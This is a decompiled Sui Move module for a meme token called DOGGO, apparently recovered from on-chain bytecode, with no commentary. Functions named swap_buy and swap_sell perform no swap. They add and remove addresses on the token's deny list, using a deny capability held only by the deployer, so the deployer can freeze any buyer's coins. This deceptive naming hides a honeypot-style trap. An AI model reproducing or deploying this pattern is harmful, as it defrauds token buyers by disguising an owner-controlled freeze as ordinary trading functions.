module 0x7245fae3dc109ae23bf5e79d782cacfde8ab6ea4659a78f9789800c9dba71a8d::doggo {
    struct DOGGO has drop {
        dummy_field: bool,
    }

    fun init(arg0: DOGGO, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<DOGGO>(arg0, 9, b"DOGGO", b"DOGGO", b"Doggo the king of meme", 0x1::option::none<0x2::url::Url>(), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<DOGGO>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<DOGGO>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<DOGGO>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<DOGGO>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<DOGGO>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<DOGGO>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<DOGGO>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<DOGGO>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

